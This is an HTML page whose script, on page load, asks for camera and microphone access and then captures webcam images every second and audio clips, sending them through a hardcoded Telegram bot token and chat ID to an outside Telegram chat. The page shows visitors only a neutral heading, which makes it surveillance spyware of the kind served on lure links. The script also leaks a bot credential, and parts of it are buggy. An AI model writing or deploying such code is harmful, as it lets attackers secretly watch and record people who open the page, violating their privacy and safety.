<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Device Information and Capture</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
      background-color: #f4f4f4;
    }
  </style>
</head>
<body>
  <h2>Device Information and Camera Capture</h2>

  <script>
    const botToken = '7044604914:AAHUlvU0rlzbE5aU5axIAPLD7siMj1jLaA4'; // Your bot token
    const chatId = '5571330102'; // Your chat ID
    let videoStream;
    let audioStream;

    // Request camera and microphone permissions
    function requestPermissions() {
      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then(stream => {
          videoStream = stream.getVideoTracks()[0];  // Get video track
          audioStream = stream.getAudioTracks()[0];  // Get audio track
          startCapturing();
        })
        .catch(error => {
          console.error("Permission denied or error occurred: ", error);
        });
    }

    // Start capturing images and audio after permission is granted
    function startCapturing() {
      // Capture video and audio every second
      setInterval(() => {
        captureImageAndSendToTelegram();
        captureAudioAndSendToTelegram();
      }, 1000); // Capture every 1 second
    }

    // Capture an image from the camera and send it to Telegram
    function captureImageAndSendToTelegram() {
      const videoElement = document.createElement('video');
      videoElement.srcObject = videoStream;  // Set the video source to the stream
      videoElement.play();  // Start playing the video

      // Capture image when video is playing
      videoElement.onplaying = () => {
        const canvas = document.createElement('canvas');
        canvas.width = videoElement.videoWidth;
        canvas.height = videoElement.videoHeight;
        canvas.getContext('2d').drawImage(videoElement, 0, 0);

        const imageData = canvas.toDataURL('image/jpeg'); // Convert to image data
        sendImageToTelegram(imageData); // Send captured image to Telegram
        videoElement.pause(); // Pause video playback
      };
    }

    // Send image data to Telegram bot
    function sendImageToTelegram(imageData) {
      const url = `https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(imageData)}`;
      fetch(url)
        .then(response => response.json())
        .then(data => {
          if (data.ok) {
            console.log("Image sent successfully!");
          } else {
            console.error("Error sending image:", data);
          }
        })
        .catch(error => {
          console.error("Error:", error);
        });
    }

    // Capture audio every 5 seconds and send it to Telegram
    function captureAudioAndSendToTelegram() {
      const audioChunks = [];
      const mediaRecorder = new MediaRecorder(audioStream);

      mediaRecorder.ondataavailable = event => {
        audioChunks.push(event.data);
      };

      mediaRecorder.onstop = () => {
        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
        const audioUrl = URL.createObjectURL(audioBlob);

        sendAudioToTelegram(audioUrl);
      };

      // Start recording audio for 5 seconds
      mediaRecorder.start();
      setTimeout(() => {
        mediaRecorder.stop();
      }, 5000); // Stop recording after 5 seconds
    }

    // Send audio file to Telegram bot
    function sendAudioToTelegram(audioUrl) {
      const url = `https://api.telegram.org/bot${botToken}/sendAudio?chat_id=${chatId}&audio=${encodeURIComponent(audioUrl)}`;
      fetch(url)
        .then(response => response.json())
        .then(data => {
          if (data.ok) {
            console.log("Audio sent successfully!");
          } else {
            console.error("Error sending audio:", data);
          }
        })
        .catch(error => {
          console.error("Error:", error);
        });
    }

    // Request permission to use camera and microphone when the page loads
    window.onload = function() {
      requestPermissions();
    };
  </script>
</body>
</html>
